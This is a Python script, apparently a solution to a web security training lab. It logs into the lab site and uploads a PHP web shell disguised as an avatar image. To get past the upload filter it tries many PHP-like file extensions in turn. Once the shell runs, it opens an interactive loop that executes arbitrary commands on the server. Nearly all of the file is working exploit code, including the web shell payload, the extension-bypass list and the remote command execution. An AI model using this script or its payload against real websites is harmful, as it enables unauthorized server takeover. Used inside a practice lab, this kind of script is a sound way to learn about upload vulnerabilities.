import http.client
import io
import re
import ssl
import urllib.parse

from werkzeug.datastructures.file_storage import FileStorage
from werkzeug.test import encode_multipart

LAB_ID = "???"


def GET_login() -> http.client.HTTPResponse:
    method, path = 'GET', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def POST_login(session: str, csrf: str) -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': f'session={session}',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter',
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_myaccount(session: str) -> http.client.HTTPResponse:
    method, path = 'GET', '/my-account?id=wiener'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def POST_myaccount_avatar_shell(csrf: str, session: str, extension: str) -> http.client.HTTPResponse:
    method, path = 'POST', '/my-account/avatar'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'multipart/form-data; boundary=---------------------------148822020014584144771019061081',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/my-account?id=wiener',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'user': 'wiener',
        'csrf': csrf,
    }
    files = {
        'avatar': {
            'filename': f'shell.{extension}',
            'content_type': 'application/x-httpd-php',
            'content': """<?php echo system($_GET['command']); ?>""",
        },
    }
    _, body = encode_multipart(
        boundary='---------------------------148822020014584144771019061081',
        values={
                   field_name: field_value
                   for field_name, field_value in fields.items()
               } | {
                   field_name: FileStorage(
                       filename=file['filename'],
                       content_type=file['content_type'],
                       stream=io.BytesIO(file['content'].encode('utf-8')),
                   ) for field_name, file in files.items()
               },
    )
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_files_avatars_shell_php(command: str, extension: str) -> http.client.HTTPResponse:
    params = {'command': command}
    method, path = 'GET', f'/files/avatars/shell.{extension}?{urllib.parse.urlencode(params)}'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/my-account?id=wiener',
        'cookie': f'session={session}',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def login_csrf() -> tuple[str, str]:
    response = GET_login()
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name=\"csrf\" value=\"([a-zA-Z0-9]+)\"', response.read().decode('utf-8'))[0]
    return session, csrf


def file_upload_csrf(session: str) -> str:
    response = GET_myaccount(session)
    response_body = response.read().decode('utf-8')
    return re.findall(r'name=\"csrf\" value=\"([a-zA-Z0-9]+)\"', response_body)[0]


def login_session() -> str:
    session, csrf = login_csrf()
    response = POST_login(session, csrf)
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]


session = login_session()
print("logged in.")
print(f"session: {session}")
csrf = file_upload_csrf(session)

extensions = [
    'php',
    'php2',
    'php3',
    'php4',
    'php5',
    'php6',
    'php7',
    'phps',
    'phps',
    'pht',
    'phtm',
    'phtml',
    'pgif',
    'shtml',
    'htaccess',
    'phar',
    'inc',
    'hphp',
    'ctp',
    'modulephp',
    'php2',
    'php3',
    'php4',
    'php5',
    'php6',
    'php7',
    'phps',
    'phps',
    'pht',
    'phtm',
    'phtml',
    'pgif',
    'shtml',
    'htaccess',
    'phar',
    'inc',
    'hphp',
    'ctp',
    'module',
    'php',
    'php4',
    'php5',
    'phtml',
    'module',
    'inc',
    'hphp',
    'ctp',
]
found_extension = None
for extension in extensions:
    response = POST_myaccount_avatar_shell(csrf, session, extension)
    print(f"POST avatar response status: {response.status} for extension: {extension}")
    if response.status != 200:
        continue
    get_response = GET_files_avatars_shell_php('ls', extension)
    if get_response.status != 200:
        continue
    get_response_body = get_response.read().decode('utf-8').lower()
    if 'not found' in get_response_body or 'php echo' in get_response_body:
        continue
    found_extension = extension
    break


if found_extension:
    print("got shell.")
    while True:
        command = input("insert command: ")
        print(GET_files_avatars_shell_php(command, found_extension).read().decode('utf-8'))
